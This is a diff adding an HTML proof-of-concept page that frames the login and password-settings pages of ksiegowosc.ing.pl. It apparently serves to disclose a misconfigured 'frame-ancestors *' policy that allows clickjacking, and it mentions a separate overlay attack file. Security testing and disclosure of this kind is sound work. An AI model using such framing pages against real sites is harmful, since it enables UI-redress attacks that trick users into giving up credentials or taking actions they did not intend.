@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>ksiegowosc.ing.pl — Clickjacking PoC (visible frame)</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background: #f5f5f5; }
+    header { background: #ff4444; color: #fff; padding: 16px 20px; }
+    header h1 { margin: 0; font-size: 18px; }
+    header p { margin: 4px 0 0; font-size: 13px; opacity: .9; }
+    .frame-wrap { padding: 20px; }
+    iframe { width: 100%; height: 720px; border: 3px solid #ff4444; background: #fff; }
+    .note { background: #fff8e1; border-left: 4px solid #ffb300; padding: 10px 14px; margin: 16px 20px; font-size: 13px; }
+    .meta { font-family: monospace; font-size: 11px; color: #666; padding: 8px 20px; background: #eee; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Clickjacking PoC — ksiegowosc.ing.pl</h1>
+    <p>Hostile origin (this page) successfully embeds the bank's authenticated UI in an iframe. The CSP <code>frame-ancestors *</code> permits any origin.</p>
+  </header>
+
+  <div class="meta">
+    Origin loading the iframe: <code id="origin"></code> &nbsp;|&nbsp; If the bank page renders below, the frame-ancestors check failed.
+  </div>
+
+  <div class="note">
+    <strong>What this proves:</strong> the response from <code>https://ksiegowosc.ing.pl/auth/login</code> ships
+    <code>Content-Security-Policy: ...; frame-ancestors *;</code> with no <code>X-Frame-Options</code> header.
+    Browsers therefore allow this attacker-controlled page to render the login form (and any other path:
+    <code>/dashboard</code>, <code>/users/settings/password</code>, <code>/auth/new-password</code>) inside an iframe.
+    The clickjacking attack file <code>poc-clickjacking-attack.html</code> uses this primitive to perform UI redress.
+  </div>
+
+  <div class="frame-wrap">
+    <h3>Target: <code>https://ksiegowosc.ing.pl/auth/login</code></h3>
+    <iframe src="https://ksiegowosc.ing.pl/auth/login"
+            title="ksiegowosc.ing.pl/auth/login (framed from attacker origin)"></iframe>
+
+    <h3 style="margin-top: 28px;">Target: <code>https://ksiegowosc.ing.pl/users/settings/password</code> (will redirect to login when no session, but the response itself is also frameable)</h3>
+    <iframe src="https://ksiegowosc.ing.pl/users/settings/password"
+            title="ksiegowosc.ing.pl/users/settings/password (framed)"></iframe>
+  </div>
+
+  <script>
+    document.getElementById('origin').textContent = window.location.origin || '(file://)';
+  </script>
+</body>
+</html>
